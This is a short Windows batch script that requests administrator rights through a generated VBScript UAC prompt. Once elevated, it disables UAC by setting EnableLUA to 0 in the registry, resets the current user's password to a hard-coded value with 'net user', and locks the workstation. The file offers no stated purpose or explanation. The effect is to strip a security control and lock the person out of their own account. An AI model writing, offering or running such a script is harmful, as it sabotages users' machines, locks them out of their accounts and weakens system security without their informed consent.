@echo off
goto checkPrivileges

:checkPrivileges
NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges )

:getPrivileges
if '%1'=='ELEV' (shift & goto gotPrivileges)
setlocal DisableDelayedExpansion
set "batchPath=%~0"
setlocal EnableDelayedExpansion
ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs"
ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs"
"%temp%\OEgetPrivileges.vbs" 
exit /B

:gotPrivileges
if exist "%temp%\OEgetPrivileges.vbs" del "%temp%\OEgetPrivileges.vbs"
setlocal & pushd .
cd /d %~dp0
if '%1'=='ELEV' (del "%temp%\OEgetPrivileges.vbs" & shift & goto main)

:main

%windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

net user %username% "RedhaT"

Rundll32.exe user32.dll,LockWorkStation

pause
